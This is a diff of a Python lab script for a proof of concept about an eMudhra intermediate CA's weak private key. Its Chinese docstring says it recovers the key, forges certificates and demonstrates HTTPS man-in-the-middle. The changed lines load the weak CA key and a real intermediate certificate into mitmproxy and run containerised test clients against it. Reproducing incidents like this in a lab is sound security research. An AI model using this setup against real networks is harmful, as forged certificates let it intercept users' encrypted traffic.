@@ -3,9 +3,9 @@
 # requires-python = ">=3.12"
 # dependencies = []
 # ///
-"""decert — Decert the anchor. Audit the fallout.
+"""decert — eMudhra 中间 CA 证书弱私钥事件 PoC。
 
-    Hunt legacy devices with broken trust anchors.
+    在本地还原私钥、伪造证书，并演示 HTTPS 中间人。
 
 用法:
   ./decert.sh run        完整复现：生成证书 → 构建镜像 → 还原私钥 → 启动攻击面 → 跑矩阵
@@ -45,7 +45,7 @@ IMAGE = "localhost/decert-client"
 PROXY_IMAGE = "localhost/decert-proxy"
 MITM_KEY = ROOT / "lab" / "mitm" / "ca.key"
 
-BANNER = "decert — Hunt legacy devices with broken trust anchors."
+BANNER = "decert — eMudhra 中间 CA 证书弱私钥事件 PoC。"
 
 
 def sh(*cmd, **kw) -> subprocess.CompletedProcess:
@@ -104,7 +104,7 @@ def cmd_attack() -> None:
     confdir.mkdir(exist_ok=True)
     MITM_KEY.write_bytes((CAS / "weak-ca.key").read_bytes())
     (confdir / "mitmproxy-ca.pem").write_bytes(
-        MITM_KEY.read_bytes() + (ROOT / "data" / "real-ca" / "g3-intermediates.pem").read_bytes())
+        MITM_KEY.read_bytes() + (ROOT / "data" / "real-ca" / "em-ov-tls-ca-g3c.pem").read_bytes())
     EV.mkdir(exist_ok=True)
     (EV / "mitm-plaintext.txt").write_text("")
     log = open(EV / "mitm.log", "w")
@@ -126,7 +126,7 @@ def cmd_test(write_evidence: bool = True) -> list[tuple[str, str, str]]:
     for tag in CLIENTS:
         for scenario, (_host, ip) in SCENARIOS.items():
             cp = sh("podman", "run", "--rm", "--network", NET,
-                    "-v", f"{ROOT}:/lab:ro,Z", "-w", "/lab", f"{IMAGE}:old",
+                    "-v", f"{ROOT}:/lab:ro,Z", "-w", "/lab", f"{IMAGE}:{tag}",
                     "python3", "lab/check.py", f"lab/cas/{TRUST[tag]}", scenario, ip,
                     capture_output=True, text=True)
             out = (cp.stdout or cp.stderr).strip()
